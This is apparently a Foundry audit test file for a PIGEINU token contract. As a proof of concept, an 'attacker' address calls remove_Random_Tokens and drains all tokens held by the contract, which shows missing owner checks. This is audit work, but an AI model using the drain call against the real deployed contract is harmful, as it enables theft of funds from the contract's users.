// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PIGEINU.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address account, uint256 amount) external {
        balanceOf[account] += amount;
    }
}

contract MinimalRouter {
    address public factory;
    address public weth;

    function WETH() public view returns (address) {
        return weth;
    }
}

contract AuditTest is Test {
    PIGEINU public pigeinu;
    MockToken public mockToken;
    address constant realPancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public owner = 0xA4b0588Df297921eF93fDa96979Bf0Db97E2F0df;
    address public attacker = makeAddr("attacker");
    
    function setUp() public {
        // Create and configure mock router
        MinimalRouter router = new MinimalRouter();
        bytes memory code = address(router).code;
        vm.etch(realPancakeRouter, code);
        
        // Set router storage slots
        vm.store(
            realPancakeRouter, 
            bytes32(uint256(0)), 
            bytes32(uint256(uint160(address(new MockFactory()))))
        );
        vm.store(
            realPancakeRouter, 
            bytes32(uint256(1)), 
            bytes32(uint256(uint160(address(new MockWETH()))))
        );
        
        // Deploy PIGEINU contract
        vm.startPrank(owner);
        pigeinu = new PIGEINU();
        vm.stopPrank();
        
        // Deploy test token
        mockToken = new MockToken();
    }

    function test_AnyUserCanRemoveTokens() public {
        // Fund contract with test tokens
        uint256 initialBalance = 1000 ether;
        mockToken.mint(address(pigeinu), initialBalance);
        
        // Pre-attack state snapshot
        console.log("--- BEFORE-Trigger Balance ---");
        uint256 preAttackBalance = mockToken.balanceOf(address(pigeinu));
        console.log("Pre-attack token balance: %s", preAttackBalance);
        assertEq(preAttackBalance, initialBalance, "Initial balance incorrect");
        
        // Attack trigger log
        console.log("--- Trigger Action: remove_Random_Tokens ---");
        
        // Non-owner drains tokens
        vm.prank(attacker);
        pigeinu.remove_Random_Tokens(address(mockToken), 100); // 100% tokens

        // Post-attack state snapshot
        console.log("--- AFTER-Trigger Balance ---");
        uint256 postAttackBalance = mockToken.balanceOf(address(pigeinu));
        console.log("Post-attack token balance: %s", postAttackBalance);
        
        // Differential validation
        bool balanceChanged = (postAttackBalance < preAttackBalance);
        bool vulnerabilityExists = (postAttackBalance == 0);
        
        if (balanceChanged) {
            console.log("State changed: Contract lost %s tokens", preAttackBalance - postAttackBalance);
        } else {
            console.log("State unchanged: Balance remains %s", postAttackBalance);
        }
        
        // Final vulnerability verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Non-owner successfully drained tokens");
        } else {
            console.log("Vulnerability not Exist: Token balance not changed");
        }
        
        // Test framework assertion
        assertEq(postAttackBalance, 0, "Tokens were not removed");
    }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x123);
    }
}

contract MockWETH {}